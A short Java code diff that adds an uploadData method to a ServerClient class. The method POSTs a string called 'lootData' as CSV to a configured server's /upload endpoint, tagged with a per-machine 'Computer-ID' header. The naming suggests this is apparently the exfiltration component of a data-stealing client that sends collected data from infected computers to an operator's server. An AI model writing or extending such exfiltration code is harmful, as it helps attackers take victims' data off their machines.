@@ -22,4 +22,17 @@ public class ServerClient {
 
         return response.body();
     }
+
+    public String uploadData(ClientConfig config, String lootData) throws IOException, InterruptedException {
+        HttpRequest request = HttpRequest.newBuilder()
+                .uri(URI.create(config.getServerUrl() + "/upload"))
+                .header("Content-Type", "text/csv")
+                .header("Computer-ID", config.getComputerId())
+                .POST(HttpRequest.BodyPublishers.ofString(lootData))
+                .build();
+
+        HttpResponse<String> response = httpClient.send(request, HttpResponse.BodyHandlers.ofString());
+
+        return response.body();
+    }
 }
